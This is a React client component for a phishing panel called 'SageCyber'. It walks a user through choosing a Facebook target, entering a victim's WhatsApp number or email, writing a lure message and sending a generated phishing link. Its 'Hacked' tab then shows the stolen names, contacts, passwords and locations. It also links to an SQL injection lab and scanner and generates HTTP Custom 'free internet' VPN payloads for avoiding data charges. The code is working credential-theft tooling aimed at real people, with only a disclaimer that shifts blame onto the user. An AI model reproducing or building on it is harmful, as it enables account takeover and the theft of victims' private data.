"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useToast } from "@/components/ui/ToastProvider";

interface CurrentUser {
  id: string;
  username: string;
}

interface Attack {
  id: string;
  targetPhone: string | null;
  targetEmail: string | null;
  attackType: string;
  emailSubject: string | null;
  message: string;
  buttonName: string;
  buttonColor: string;
  responseStatus: string | null;
  statusInfo: string | null;
  linkId: string;
  linkUrl: string;
  createdAt: string | null;
}

interface Hacked {
  id: string;
  name: string | null;
  phoneOrEmail: string;
  password: string;
  accountType: string;
  location: string | null;
  createdAt: string | null;
  seen: boolean | null;
}

type Tab = "attack" | "pending" | "hacked";

const FREENET_SERVERS = [
  { label: "SA server 3 (Faster - 2days)", value: "sa3.vpnjantit.com" },
  { label: "SA server 2 (Faster unstable - 4 days)", value: "sa2.vpnjantit.com" },
  { label: "Germany server 5 (Fair - 7days)", value: "gr5.vpnjantit.com" },
  { label: "Germany server 6 (Fair - 7days)", value: "gr6.vpnjantit.com" },
  { label: "Germany server 7 (Fair - 7days)", value: "gr7.vpnjantit.com" },
];

export default function CyberClient({ currentUser }: { currentUser: CurrentUser | null }) {
  const { showToast } = useToast();
  const [tab, setTab] = useState<Tab>("attack");
  const [showMore, setShowMore] = useState(false);

  // Attack form state
  const [step, setStep] = useState(1);
  const [attackType, setAttackType] = useState("");
  const [mode, setMode] = useState("");
  const [targetPhone, setTargetPhone] = useState("");
  const [targetEmail, setTargetEmail] = useState("");
  const [emailSubject, setEmailSubject] = useState("");
  const [message, setMessage] = useState("");
  const [messageSent, setMessageSent] = useState(false);
  const [buttonText, setButtonText] = useState("Click here to find out");
  const [buttonColor, setButtonColor] = useState("#085e4a");
  const [attackResult, setAttackResult] = useState<{ linkUrl: string; linkId: string } | null>(null);
  const [attackMsg, setAttackMsg] = useState("");
  const [formError, setFormError] = useState("");
  const linkIdRef = useRef<string>("");

  // Pending attacks
  const [attacks, setAttacks] = useState<Attack[]>([]);
  const [pendingLoading, setPendingLoading] = useState(false);
  const [expandedPending, setExpandedPending] = useState<string | null>(null);

  // Hacked list
  const [hackedList, setHackedList] = useState<Hacked[]>([]);
  const [hackedLoading, setHackedLoading] = useState(false);
  const [expandedHacked, setExpandedHacked] = useState<string | null>(null);
  const [passInput, setPassInput] = useState("");
  const [passError, setPassError] = useState("");
  const [passChecking, setPassChecking] = useState(false);
  const [hackedUnlocked, setHackedUnlocked] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [hackedCount, setHackedCount] = useState(0);
  const [pendingCount, setPendingCount] = useState(0);

  // Free internet modal
  const [showFreenet, setShowFreenet] = useState(false);
  const [showFreenetOptions, setShowFreenetOptions] = useState(false);
  const [freenetUsername, setFreenetUsername] = useState("");
  const [freenetPassword, setFreenetPassword] = useState("");
  const [freenetServer, setFreenetServer] = useState("");
  const [freenetPayload, setFreenetPayload] = useState("");
  const [freenetCopied, setFreenetCopied] = useState(false);
  const [freenetBtnMsg, setFreenetBtnMsg] = useState("Generate payload");
  const [copyBtnMsg, setCopyBtnMsg] = useState("Copy payload");

  // SQL scanner state
  const [scanTab, setScanTab] = useState(false);
  const isGuest = !currentUser;

  useEffect(() => {
    if (!linkIdRef.current) {
      linkIdRef.current = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
    }
  }, []);

  useEffect(() => {
    const remembered = window.localStorage.getItem("freenetServer");
    if (remembered) setFreenetServer(remembered);
    else window.localStorage.setItem("freenetServer", "none");
  }, []);

  useEffect(() => {
    if (tab === "pending" && currentUser) loadPending();
  }, [tab]);

  useEffect(() => {
    if (currentUser) {
      loadPending();
    }
  }, [currentUser]);

  async function loadPending() {
    setPendingLoading(true);
    try {
      const res = await fetch("/api/cyber/attacks");
      if (res.ok) {
        const data = await res.json();
        setAttacks(data);
        setPendingCount(data.length);
      } else {
        showToast({ type: "error", message: "Unable to load pending attacks." });
      }
    } finally {
      setPendingLoading(false);
    }
  }

  async function deletePending(id: string) {
    const res = await fetch(`/api/cyber/attacks/${id}`, { method: "DELETE" });
    if (res.ok) {
      setAttacks((prev) => {
        const next = prev.filter((a) => a.id !== id);
        setPendingCount(next.length);
        return next;
      });
      showToast({ type: "success", message: "Pending attack deleted." });
    } else {
      showToast({ type: "error", message: "Unable to delete pending attack." });
    }
  }

  async function verifyPassword() {
    if (!passInput.trim()) return;
    setPassChecking(true);
    setPassError("");
    try {
      const res = await fetch("/api/cyber/hacked", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: passInput }),
      });
      if (res.ok) {
        const data = await res.json();
        setHackedList(data);
        setHackedUnlocked(true);
        setHackedCount(data.length);
        showToast({ type: "success", message: "Hacked records unlocked." });
      } else {
        setPassError("Wrong password. Try again.");
        showToast({ type: "error", message: "Wrong password. Try again." });
      }
    } finally {
      setPassChecking(false);
    }
  }

  async function deleteHacked(id: string) {
    const res = await fetch(`/api/cyber/hacked/${id}`, { method: "DELETE" });
    if (res.ok) {
      setHackedList((prev) => {
        const next = prev.filter((h) => h.id !== id);
        setHackedCount(next.length);
        return next;
      });
      showToast({ type: "success", message: "Hacked record deleted." });
    } else {
      showToast({ type: "error", message: "Unable to delete hacked record." });
    }
  }

  function buildLinkUrl(type: string, id: string) {
    const base = window.location.origin;
    const short = type === "facebook" ? "fb" : type === "instagram" ? "inst" : type;
    return `${base}/cyber/f/${short}?i=${id}`;
  }

  async function launchAttack() {
    if (!currentUser) {
      setFormError("Login is required to launch and manage attacks.");
      return;
    }
    setAttackMsg("Please wait..");
    const linkId = linkIdRef.current;
    const linkUrl = buildLinkUrl(attackType, linkId);

    const res = await fetch("/api/cyber/attack", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        targetPhone: targetPhone || "unset",
        targetEmail: targetEmail || "unset",
        attackType,
        emailSubject: emailSubject || "unset",
        message,
        buttonName: buttonText || "Click here to find out",
        buttonColor: buttonColor || "#085",
        linkId,
        linkUrl,
      }),
    });

    if (res.ok) {
      setAttackResult({ linkUrl, linkId });
      setAttackMsg("Attack launched successfully!");
      showToast({ type: "success", message: "Attack launched successfully." });
      loadPending();
    } else {
      setAttackMsg("Failed to launch attack.");
      showToast({ type: "error", message: "Failed to launch attack." });
    }
  }

  function resetAttack() {
    setStep(1);
    setAttackType("");
    setMode("");
    setTargetPhone("");
    setTargetEmail("");
    setEmailSubject("");
    setMessage("");
    setMessageSent(false);
    setButtonText("Click here to find out");
    setButtonColor("#085e4a");
    setAttackResult(null);
    setAttackMsg("");
    setFormError("");
    linkIdRef.current = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
  }

  function proceedStep1(type: string) {
    if (!currentUser) {
      setFormError("Login is required for attack and hacked-data features.");
      return;
    }
    setAttackType(type);
    setStep(2);
  }

  function requireLoginForProtected(tabName: "attack" | "hacked" | "pending") {
    if (!currentUser) {
      setTab("attack");
      setScanTab(false);
      setShowMore(false);
      setFormError(
        tabName === "attack"
          ? "Login is required to launch attacks."
          : "Login is required to access saved attack and hacked-account data."
      );
      return true;
    }
    return false;
  }

  const protectedHint = (
    <div className="rounded border border-white/10 bg-white/5 p-4 text-xs text-white/70">
      <p className="mb-3">
        This feature is tied to saved account data, so it is only available after login.
      </p>
      <div className="flex gap-2">
        <Link href="/login" className="rounded bg-teal-700 px-4 py-2 text-white">
          Login
        </Link>
        <Link href="/register" className="rounded border border-white/20 px-4 py-2 text-white/80">
          Register
        </Link>
      </div>
    </div>
  );

  function proceedStep2() {
    if (mode === "whatsapp" && !targetPhone.trim()) {
      setFormError("Enter the target WhatsApp number");
      return;
    }
    if ((mode === "email" || mode === "both") && !targetEmail.trim()) {
      setFormError("Enter the target email");
      return;
    }
    if ((mode === "email" || mode === "both") && (!targetEmail.includes("@") || !targetEmail.includes("."))) {
      setFormError("Enter a valid email address");
      return;
    }
    setFormError("");
    setStep(3);
  }

  function proceedStep3() {
    if (!message.trim() || message.trim().length < 5) {
      setFormError("Message is too short");
      return;
    }
    if ((mode === "both" || mode === "email") && !emailSubject.trim()) {
      setFormError("Enter the email subject");
      return;
    }
    setFormError("");

    if (mode === "whatsapp" || mode === "both") {
      const linkUrl = buildLinkUrl(attackType, linkIdRef.current);
      const waLink = `https://api.whatsapp.com/send?phone=${targetPhone}&text=${encodeURIComponent(message + " " + linkUrl)}`;
      window.open(waLink, "_blank");
    }
    setStep(4);
  }

  function proceedStep4() {
    setFormError("");
    setStep(5);
  }

  function generateFreenetPayload() {
    if (!freenetUsername.trim() || !freenetPassword.trim() || !freenetServer.trim()) {
      setFreenetBtnMsg("Please fill all the fields");
      setTimeout(() => setFreenetBtnMsg("Generate payload"), 2000);
      return;
    }
    const payload = `${freenetServer}:1-65535@${freenetUsername}-vpnjantit.com:${freenetPassword}`;
    setFreenetPayload(payload);
    setFreenetBtnMsg("Payload successfully created");
    setTimeout(() => setFreenetBtnMsg("Generate payload"), 5000);
  }

  function copyFreenetPayload() {
    if (!freenetPayload) {
      setCopyBtnMsg("No generated payload to copy");
      setTimeout(() => setCopyBtnMsg("Copy payload"), 3000);
      return;
    }
    navigator.clipboard.writeText(freenetPayload);
    setFreenetCopied(true);
    setCopyBtnMsg("Payload copied, paste it in the http custom vpn");
    setTimeout(() => {
      setFreenetCopied(false);
      setCopyBtnMsg("Copy payload");
    }, 8000);
  }

  function copyLink(url: string) {
    navigator.clipboard.writeText(url);
  }

  const attackTypeIcon: Record<string, string> = {
    facebook: "/icons/social_icons/facebook_icon.png",
    instagram: "/icons/social_icons/instagram_icon.png",
    twitter: "/icons/social_icons/twitter_icon.png",
  };

  return (
    <div className="text-white text-sm">
      {/* Header */}
      <div className="mb-2">
        <h5
          className="text-right text-white/70 mb-1 border-b border-black/50 pb-1"
          style={{ fontFamily: "serif", fontStyle: "italic" }}
        >
          <i className="fa fa-lock mr-1 text-xs" /> SageCyber
        </h5>

        {/* Navbar */}
        <ul className="grid grid-cols-4 gap-1 bg-white/5 p-2 text-xs text-center rounded">
          <li
            className={`cursor-pointer py-1 ${tab === "attack" ? "text-cyan-400 border-b border-gray-400 rounded" : ""} ${isGuest ? "opacity-80" : ""}`}
            onClick={() => {
              setScanTab(false);
              setShowMore(false);
              if (requireLoginForProtected("attack")) return;
              setTab("attack");
            }}
          >
            <i className="fa fa-fighter-jet mr-1 hidden sm:inline" />Attack
          </li>
          <li
            className={`cursor-pointer py-1 relative ${tab === "hacked" ? "text-cyan-400 border-b border-gray-400 rounded" : ""} ${isGuest ? "opacity-70" : ""}`}
            onClick={() => {
              if (requireLoginForProtected("hacked")) return;
              setTab("hacked");
              setScanTab(false);
              setShowMore(false);
            }}
          >
            <i className="fa fa-unlock-alt mr-1 hidden sm:inline" />Hacked
            {hackedCount > 0 && (
              <sup className="bg-red-600 text-white px-1 rounded text-[10px] ml-0.5">{hackedCount}</sup>
            )}
          </li>
          <li
            className={`cursor-pointer py-1 ${scanTab ? "text-cyan-400 border-b border-gray-400 rounded" : ""}`}
            onClick={() => { setScanTab(true); setTab("attack"); setShowMore(false); }}
          >
            Scanner
          </li>
          <li
            className="cursor-pointer py-1"
            onClick={() => setShowMore((v) => !v)}
          >
            <i className="fa fa-align-justify" />
          </li>
        </ul>

        {/* More links dropdown */}
        {showMore && (
          <ul className="bg-black/40 border border-white/10 mt-1 rounded overflow-hidden">
            <li
              className="grid grid-cols-[10%_90%] gap-1 items-center py-4 px-3 border-b border-white/10 cursor-pointer hover:text-cyan-400"
              onClick={() => { setShowMore(false); window.location.href = "/cyber/sql-injection"; }}
            >
              <i className="fa fa-paper-plane" />
              <span>Learn SQL Injection <em className="text-red-400">(Live lab)</em></span>
            </li>
            <li
              className="grid grid-cols-[10%_90%] gap-1 items-center py-4 px-3 border-b border-white/10 cursor-pointer hover:text-cyan-400"
              onClick={() => setShowFreenetOptions((v) => !v)}
            >
              <i className="fa fa-globe" />
              <div>
                <span>Free Internet</span>
                {showFreenetOptions && (
                  <ol className="mt-3 space-y-3 pl-4 text-xs text-white/80">
                    <li>
                      <button
                        className="text-left hover:text-cyan-400"
                        onClick={(e) => {
                          e.stopPropagation();
                          setFreenetServer(window.localStorage.getItem("freenetServer") ?? "none");
                          setShowFreenet(true);
                          setShowMore(false);
                          setShowFreenetOptions(false);
                        }}
                      >
                        Generate Http custom VPN freenet
                      </button>
                    </li>
                    <li>
                      <a href="https://t.me/sageTechh" target="_blank" rel="noreferrer" className="hover:text-cyan-400">
                        Download free internet config files (Telegram)
                      </a>
                    </li>
                  </ol>
                )}
              </div>
            </li>
          </ul>
        )}
      </div>

      {/* Scanner redirect notice */}
      {scanTab && (
        <div className="bg-white/5 p-4 rounded border border-white/10 mb-2">
          <h2 className="font-bold mb-2">SQL Injection Scanner</h2>
          <p className="text-white/70 text-xs mb-3">
            The full SQL injection scanner is available inside the SQL Injection Lab.
          </p>
          <Link
            href="/cyber/sql-injection"
            className="inline-block bg-teal-700 hover:bg-teal-600 text-white px-4 py-2 rounded text-xs"
            onClick={() => setScanTab(false)}
          >
            Open SQL Injection Lab
          </Link>
          <button
            className="ml-3 text-xs text-white/50 hover:text-white"
            onClick={() => setScanTab(false)}
          >
            Cancel
          </button>
        </div>
      )}

      {isGuest && (
        <div className="mb-3 rounded border border-cyan-700/30 bg-cyan-900/10 p-3 text-xs text-white/75">
          Public tools are available here for guests, including the SQL Injection lab link and free internet payload generation.
          Login is only required for features that store or expose user-linked cyber data such as launching attacks, pending attacks, and hacked results.
        </div>
      )}

      {/* ====== ATTACK TAB ====== */}
      {tab === "attack" && !scanTab && (
        <div onClick={() => setShowMore(false)}>
          {isGuest && (
            <div className="mb-3">
              {protectedHint}
            </div>
          )}
          {attackResult ? (
            <div className="space-y-3">
              <div className="bg-teal-900/50 border border-teal-600/40 p-3 rounded text-white/90">
                {attackMsg}
              </div>
              <div className="bg-white/5 border border-white/10 p-3 rounded space-y-2">
                <p>Your <span className="capitalize">{attackType}</span> phishing link:</p>
                <a href={attackResult.linkUrl} target="_blank" className="text-sky-400 break-all text-xs">
                  {attackResult.linkUrl}
                </a>
                <p className="text-white/60 text-xs">
                  Do not submit your own data on this page. This link is temporary and deleted after the target submits data.
                </p>
                <div className="flex gap-2 mt-1">
                  <button
                    onClick={() => copyLink(attackResult.linkUrl)}
                    className="bg-teal-700 hover:bg-teal-600 text-white px-4 py-1.5 rounded text-xs"
                  >
                    Copy link
                  </button>
                  <button
                    onClick={resetAttack}
                    className="border border-white/30 text-white/70 hover:text-white px-4 py-1.5 rounded text-xs"
                  >
                    New attack
                  </button>
                </div>
              </div>
            </div>
          ) : (
            <>
              <div className="text-cyan-400 font-bold mb-2 text-xs" style={{ wordSpacing: "1.7px" }}>
                {step === 1 && "PHISHING >> Choose what you want to attack:"}
                {step === 2 && "Choose the mode of sending an attack"}
                {step === 3 && "Write a message that will convince the user to click on the link"}
                {step === 4 && "Edit the link button"}
                {step === 5 && "Read our conditions and decide"}
              </div>

              {formError && (
                <div className="bg-red-800/60 text-white text-xs px-3 py-1.5 rounded mb-2">{formError}</div>
              )}

              {/* Step 1: Choose platform */}
              {step === 1 && (
                <ul className="space-y-4">
                  <li
                    className="flex items-center gap-3 cursor-pointer border-b border-white/10 pb-3 hover:text-cyan-400"
                    onClick={() => proceedStep1("facebook")}
                  >
                    <img src="/icons/social_icons/facebook_icon.png" className="w-5 h-5" alt="fb" />
                    Attack facebook user {isGuest ? <span className="text-[10px] text-red-300">(login required)</span> : null}
                  </li>
                  <li
                    className="flex items-center gap-3 cursor-pointer border-b border-white/10 pb-3 text-white/40"
                  >
                    <img src="/icons/social_icons/instagram_icon.png" className="w-5 h-5 opacity-40" alt="ig" />
                    Attack instagram user <em className="text-xs ml-2">(coming soon)</em>
                  </li>
                </ul>
              )}

              {/* Step 2: Mode + contact */}
              {step === 2 && (
                <div className="space-y-3">
                  <select
                    className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded text-sm outline-none cursor-pointer"
                    value={mode}
                    onChange={(e) => setMode(e.target.value)}
                  >
                    <option value="" disabled>Choose mode of sending</option>
                    <option value="whatsapp">WhatsApp</option>
                  </select>
                  {(mode === "whatsapp" || mode === "both") && (
                    <input
                      type="number"
                      className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded outline-none"
                      placeholder="Enter target WhatsApp number"
                      value={targetPhone}
                      onChange={(e) => setTargetPhone(e.target.value)}
                    />
                  )}
                  {(mode === "email" || mode === "both") && (
                    <input
                      className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded outline-none"
                      placeholder="Enter target email..."
                      value={targetEmail}
                      onChange={(e) => setTargetEmail(e.target.value)}
                    />
                  )}
                  {mode && (
                    <button
                      onClick={proceedStep2}
                      className="bg-teal-700 hover:bg-teal-600 text-white px-6 py-2 rounded text-sm"
                    >
                      Proceed
                    </button>
                  )}
                </div>
              )}

              {/* Step 3: Message */}
              {step === 3 && (
                <div className="space-y-3">
                  {(mode === "both" || mode === "email") && (
                    <input
                      className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded outline-none"
                      placeholder="Type email subject..."
                      value={emailSubject}
                      onChange={(e) => setEmailSubject(e.target.value)}
                    />
                  )}
                  <textarea
                    className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded outline-none resize-none h-28"
                    placeholder="Write message..."
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                  />
                  {(mode === "whatsapp" || mode === "both") && (
                    <p className="text-white/70 text-xs" style={{ wordSpacing: "1.5px" }}>
                      We will take you to your WhatsApp to send this message, then come back and confirm.{" "}
                      <strong>Don&apos;t reload this page.</strong>
                    </p>
                  )}
                  <button
                    onClick={proceedStep3}
                    className="bg-teal-700 hover:bg-teal-600 text-white px-6 py-2 rounded text-sm"
                  >
                    Proceed
                  </button>
                  {(mode === "whatsapp" || mode === "both") && (
                    <div className="flex items-center gap-2 mt-1">
                      <input
                        type="checkbox"
                        id="confirm-sent"
                        checked={messageSent}
                        onChange={(e) => {
                          setMessageSent(e.target.checked);
                          if (e.target.checked) proceedStep3();
                        }}
                      />
                      <label htmlFor="confirm-sent" className="text-sm cursor-pointer">
                        I have sent the message.
                      </label>
                    </div>
                  )}
                </div>
              )}

              {/* Step 4: Button customisation */}
              {step === 4 && (
                <div className="space-y-3">
                  <div className="text-center">
                    <button
                      className="px-6 py-2 text-white rounded"
                      style={{ background: buttonColor }}
                    >
                      {buttonText || "Click here to find out"}
                    </button>
                  </div>
                  <input
                    className="w-full bg-white/5 border border-white/10 text-white/80 p-2 rounded outline-none"
                    placeholder="Type button name..."
                    value={buttonText}
                    onChange={(e) => setButtonText(e.target.value)}
                  />
                  <label className="text-white/80 text-xs">Set button color</label>
                  <input
                    type="color"
                    className="w-full h-10 rounded cursor-pointer"
                    value={buttonColor}
                    onChange={(e) => setButtonColor(e.target.value)}
                  />
                  <button
                    onClick={proceedStep4}
                    className="bg-teal-700 hover:bg-teal-600 text-white px-6 py-2 rounded text-sm"
                  >
                    Proceed
                  </button>
                </div>
              )}

              {/* Step 5: Conditions */}
              {step === 5 && (
                <div className="space-y-4">
                  <div className="text-white/80 text-xs leading-5" style={{ wordSpacing: "1.6px" }}>
                    I accept that I will be held responsible if I am found with any account information of the targeted user.
                    I understand that phishing is a cyber crime when used for wrong purposes if not educational.
                    <br />
                    <strong className="text-red-400">Note:</strong> We are not responsible for any crime you may commit
                    while using our system or any wrong information you might get from the attack.
                  </div>
                  <div className="flex gap-3">
                    <button
                      onClick={launchAttack}
                      className="bg-teal-800 hover:bg-teal-600 text-white px-6 py-2 rounded text-sm border border-black/30"
                    >
                      {attackMsg || <>Attack now <i className="fa fa-fighter-jet ml-1" /></>}
                    </button>
                    <button
                      onClick={resetAttack}
                      className="text-white/50 hover:text-white text-xs px-4 py-2 border border-white/20 rounded"
                    >
                      I Decline
                    </button>
                  </div>
                </div>
              )}
            </>
          )}
        </div>
      )}

      {/* ====== PENDING TAB ====== */}
      {tab === "pending" && (
        <div>
          {isGuest ? (
            protectedHint
          ) : (
            <>
          <div className="grid grid-cols-2 gap-1 bg-white/5 p-2 mb-3 rounded text-xs">
            <button
              className="text-red-400 text-center py-1 cursor-pointer"
              onClick={() => setTab("pending")}
            >
              Pending ({pendingCount})
            </button>
            <button
              className="text-green-400 text-center py-1 cursor-pointer"
              onClick={() => { setTab("hacked"); }}
            >
              Successful
            </button>
          </div>
          {pendingLoading ? (
            <div className="text-center py-6 text-white/50">Loading...</div>
          ) : attacks.length === 0 ? (
            <div className="text-center py-8 text-white/50">
              <p>You have no pending attacks!</p>
              <button
                onClick={() => setTab("attack")}
                className="mt-3 bg-teal-700 hover:bg-teal-600 text-white px-5 py-2 rounded text-xs"
              >
                Attack now!
              </button>
            </div>
          ) : (
            <ul className="space-y-4">
              {attacks.map((a) => {
                const icon = attackTypeIcon[a.attackType] || "/files/sagetech_icon.jpg";
                const expanded = expandedPending === a.id;
                return (
                  <li key={a.id} className="border-b border-white/5 pb-3">
                    <div className="flex gap-3 items-start">
                      <img src={icon} className="w-5 h-5 mt-1 shrink-0" alt={a.attackType} />
                      <div className="flex-1 min-w-0">
                        <div className="text-white/40 text-[11px] mb-1">{a.createdAt?.slice(0, 10)}</div>
                        <ul className="space-y-0.5 text-xs">
                          <li
                            className="flex items-center gap-2 cursor-pointer"
                            onClick={() => setExpandedPending(expanded ? null : a.id)}
                          >
                            <i className={`fa fa-chevron-${expanded ? "up" : "down"} text-[10px]`} />
                            {a.targetEmail !== "unset" && <span>Email: <span className="text-cyan-300">{a.targetEmail}</span></span>}
                            {a.targetPhone !== "unset" && <span>Phone: <span className="text-cyan-300">{a.targetPhone}</span></span>}
                          </li>
                          <li>
                            Status:{" "}
                            <span
                              className="px-1 py-0.5 rounded text-[10px] text-white"
                              style={{ background: a.responseStatus === "Success" ? "#085" : a.responseStatus === "Link clicked" ? "#068" : "#333" }}
                            >
                              {a.responseStatus}
                            </span>{" "}
                            <span className="text-cyan-400/70 text-[10px]">&gt;&gt; {a.statusInfo}</span>
                          </li>
                          {expanded && (
                            <>
                              {a.emailSubject !== "unset" && <li>Subject: <span className="text-white/70">{a.emailSubject?.slice(0, 20)}</span></li>}
                              <li>Message: <span className="text-white/70">{a.message?.slice(0, 20)}..</span></li>
                              <li className="flex items-center gap-2">
                                Link:{" "}
                                <span
                                  className="text-sky-400 cursor-pointer text-[11px] truncate max-w-[150px]"
                                  onClick={() => copyLink(a.linkUrl)}
                                  title={a.linkUrl}
                                >
                                  {a.linkUrl}
                                </span>
                                <i
                                  className="fa fa-copy cursor-pointer text-white/40 hover:text-white"
                                  onClick={() => copyLink(a.linkUrl)}
                                />
                              </li>
                              <li>
                                Type: <span className="text-white/70 capitalize">{a.attackType}</span>{" "}
                                <i
                                  className="fa fa-trash-alt ml-2 cursor-pointer text-red-400 hover:text-red-300"
                                  onClick={() => deletePending(a.id)}
                                />
                              </li>
                            </>
                          )}
                        </ul>
                      </div>
                    </div>
                  </li>
                );
              })}
            </ul>
          )}
            </>
          )}
        </div>
      )}

      {/* ====== HACKED TAB ====== */}
      {tab === "hacked" && (
        <div>
          {isGuest ? (
            protectedHint
          ) : (
            <>
          <div className="grid grid-cols-2 gap-1 bg-white/5 p-2 mb-3 rounded text-xs">
            <button
              className="text-red-400 text-center py-1 cursor-pointer"
              onClick={() => { setTab("pending"); loadPending(); }}
            >
              Pending
            </button>
            <button className="text-green-400 text-center py-1 font-semibold border-b border-green-400">
              Successful
            </button>
          </div>

          {!hackedUnlocked ? (
            <div className="max-w-sm mx-auto">
              <p className="text-white/80 mb-3 text-xs">Please confirm your password to view hacked data.</p>
              <div className="relative">
                <input
                  type={showPass ? "text" : "password"}
                  className="w-full bg-white/5 border border-white/20 text-black p-2 rounded outline-none pr-8"
                  value={passInput}
                  onChange={(e) => setPassInput(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && verifyPassword()}
                />
                <i
                  className={`fa ${showPass ? "fa-eye-slash" : "fa-eye"} absolute right-2 bottom-2.5 text-black/50 cursor-pointer`}
                  onClick={() => setShowPass((v) => !v)}
                />
              </div>
              {passError && <p className="text-red-400 text-xs mt-1">{passError}</p>}
              <div className="flex gap-2 mt-3">
                <button
                  onClick={verifyPassword}
                  disabled={passChecking || !passInput.trim()}
                  className="bg-teal-700 hover:bg-teal-600 disabled:opacity-40 text-white px-5 py-2 rounded text-xs"
                >
                  {passChecking ? "Confirming..." : "Continue"}
                </button>
                <button
                  onClick={() => setTab("attack")}
                  className="border border-white/20 text-white/50 hover:text-white px-5 py-2 rounded text-xs"
                >
                  Cancel
                </button>
              </div>
            </div>
          ) : hackedList.length === 0 ? (
            <div className="text-center py-8 text-white/50">
              <p>You have not hacked anyone!</p>
              <button
                onClick={() => setTab("attack")}
                className="mt-3 bg-teal-700 hover:bg-teal-600 text-white px-5 py-2 rounded text-xs"
              >
                Hack now!
              </button>
            </div>
          ) : (
            <ul className="space-y-4">
              {hackedList.map((h) => {
                const icon = attackTypeIcon[h.accountType] || "/files/sagetech_icon.jpg";
                const expanded = expandedHacked === h.id;
                const isEmail = h.phoneOrEmail.includes("@") || h.phoneOrEmail.includes(".com");
                return (
                  <li key={h.id} className="border-b border-white/5 pb-3">
                    <div className="flex gap-3 items-start">
                      <img src={icon} className="w-5 h-5 mt-1 shrink-0" alt={h.accountType} />
                      <div className="flex-1 min-w-0">
                        <div className="text-white/40 text-[11px] mb-1">{h.createdAt?.slice(0, 10)}</div>
                        <ul className="space-y-0.5 text-xs">
                          <li
                            className="flex items-center gap-2 cursor-pointer"
                            onClick={() => setExpandedHacked(expanded ? null : h.id)}
                          >
                            <i className={`fa fa-chevron-${expanded ? "up" : "down"} text-[10px]`} />
                            {h.name && <span>Name: <span className="text-cyan-300 capitalize">{h.name}</span></span>}
                            <span>{isEmail ? "Email" : "Phone"}: <span className="text-cyan-300">{h.phoneOrEmail}</span></span>
                          </li>
                          {expanded && (
                            <>
                              <li>Password: <span className="text-white/70">{h.password}</span></li>
                              {h.location && <li>Location: <span className="text-white/70">{h.location}</span></li>}
                              <li>
                                Account: <span className="text-white/70 capitalize">{h.accountType}</span>{" "}
                                <i
                                  className="fa fa-trash-alt ml-2 cursor-pointer text-red-400 hover:text-red-300"
                                  onClick={() => deleteHacked(h.id)}
                                />
                              </li>
                            </>
                          )}
                        </ul>
                      </div>
                    </div>
                  </li>
                );
              })}
            </ul>
          )}
            </>
          )}
        </div>
      )}

      {/* ====== FREE INTERNET MODAL ====== */}
      {showFreenet && (
        <div
          className="fixed inset-0 z-50 bg-black/50 flex items-start justify-center pt-8 px-2"
          onClick={(e) => { if (e.target === e.currentTarget) setShowFreenet(false); }}
        >
          <div className="bg-white text-black rounded max-w-lg w-full p-5 max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setShowFreenet(false)}
              className="float-right text-black/60 hover:text-black font-bold px-2"
            >
              X
            </button>
            <br />
            <div className="border border-black/30 p-3 rounded mb-4 text-sm">
              <strong>Note:</strong> To generate the HTTP Custom VPN freenet, you must first create your SSH account
              with one of the following servers and copy your <b>username</b> and <b>password</b> to paste in the
              inputs below (<i>The server name is auto-inserted but make sure it really matches your SSH server</i>):
              <ul className="mt-2 space-y-2 pl-4">
                {FREENET_SERVERS.map((s) => (
                  <li key={s.value}>
                    <a
                      href={`https://www.vpnjantit.com/create-free-account?server=${s.value.startsWith("sa3") ? "sa3" : s.value.startsWith("sa2") ? "sa2" : s.value.startsWith("gr5") ? "gr5" : s.value.startsWith("gr6") ? "gr6" : "gr7"}&type=SSH`}
                      target="_blank"
                      rel="noreferrer"
                      className="text-blue-700 underline text-xs"
                      onClick={() => {
                        window.localStorage.setItem("freenetServer", s.value);
                        setFreenetServer(s.value);
                      }}
                    >
                      {s.label}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            <div className="space-y-2 text-sm">
              <div>
                <label className="block mb-1 text-xs font-medium">Username</label>
                <input
                  className="w-full border border-black/20 p-2 rounded outline-none"
                  value={freenetUsername}
                  onChange={(e) => setFreenetUsername(e.target.value)}
                />
              </div>
              <div>
                <label className="block mb-1 text-xs font-medium">Password</label>
                <input
                  className="w-full border border-black/20 p-2 rounded outline-none"
                  value={freenetPassword}
                  onChange={(e) => setFreenetPassword(e.target.value)}
                />
              </div>
              <div>
                <label className="block mb-1 text-xs font-medium">Server</label>
                <input
                  className="w-full border border-black/20 p-2 rounded outline-none"
                  value={freenetServer}
                  onChange={(e) => setFreenetServer(e.target.value)}
                  placeholder="e.g. sa3.vpnjantit.com"
                />
              </div>
              <button
                onClick={generateFreenetPayload}
                className="bg-blue-800 text-white px-5 py-2 rounded text-sm"
              >
                {freenetBtnMsg}
              </button>
              {freenetPayload && (
                <div className="mt-3 space-y-2">
                  <textarea
                    readOnly
                    className="w-full border border-black/20 p-2 rounded resize-none h-16 text-xs"
                    value={freenetPayload}
                  />
                  <button
                    onClick={copyFreenetPayload}
                    className="bg-blue-900 text-white px-5 py-2 rounded text-sm"
                  >
                    {freenetCopied ? copyBtnMsg : copyBtnMsg}
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
